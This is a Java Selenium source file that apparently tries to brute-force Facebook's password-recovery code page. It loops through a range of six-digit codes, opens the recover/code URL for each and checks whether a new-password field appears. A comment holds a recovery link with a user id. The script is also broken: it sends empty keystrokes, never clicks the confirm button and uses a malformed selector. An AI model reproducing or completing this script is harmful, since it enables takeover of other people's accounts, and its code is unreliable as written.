package FB_AutoPost_Groups;

import java.io.File; 
import java.io.FileInputStream; 
import java.io.FileNotFoundException; 
import java.io.IOException; 
import java.lang.reflect.InvocationTargetException; 
import java.util.concurrent.TimeUnit;   
import org.apache.poi.xssf.usermodel.XSSFSheet; 
import org.apache.poi.xssf.usermodel.XSSFWorkbook; 
import org.openqa.selenium.*;   
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.firefox.FirefoxBinary;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.firefox.FirefoxProfile;
import org.openqa.selenium.interactions.Action;
import org.openqa.selenium.interactions.Actions;
import org.openqa.selenium.remote.DesiredCapabilities;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.Date;
import java.util.Random;
import java.util.StringTokenizer;
import org.openqa.selenium.Alert;
import org.openqa.selenium.Cookie;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.firefox.FirefoxDriver;

 
public class FB_Selenium_Short {
		
 private static WebDriver driver = null;

  
 public static void main(String[] args) throws InterruptedException, IOException {   

// Create a new instance of the Chrome driver   
//System.setProperty("webdriver.chrome.driver", "C://Selenium_Training//chromedriver.exe"); 
//WebDriver driver=new ChromeDriver();
	 
//Invoke Firefox Driver;
	 WebDriver driver=new FirefoxDriver();

//Declaring variables for recover code and new password input field
WebElement recovercode;
WebElement newpassword;

//Navigate to Facebook page.
driver.get("https://www.facebook.com");
 
//for loop for the recover code
for (int i =566511; i <=566600; i++)
    	 { 
     driver.manage().timeouts().implicitlyWait(20, TimeUnit.SECONDS);
     
     //recover code + for array array input
     driver.navigate().to("https://www.facebook.com/recover/code?");
     
    // http://m.facebook.com/recover/code?u=100012896981286&n=566514
     
     //get the recovercode input value and store it to WebElement
     recovercode = driver.findElement(By.name("n"));
     
     //Check condition whether recovercode or newpassword input field is enabled.
     if(recovercode.isEnabled()) 
     {
     recovercode.click();
     recovercode.sendKeys();
     System.out.println(i);
     driver.findElement(By.cssSelector("uiButton uiButtonConfirm"));
     continue;
     
     }
     else
     {
   	 newpassword = driver.findElement(By.name("newpassword"));
   	 System.out.println("You can enter now new password");
   	 break;
   	 }
     
   	 }

}
}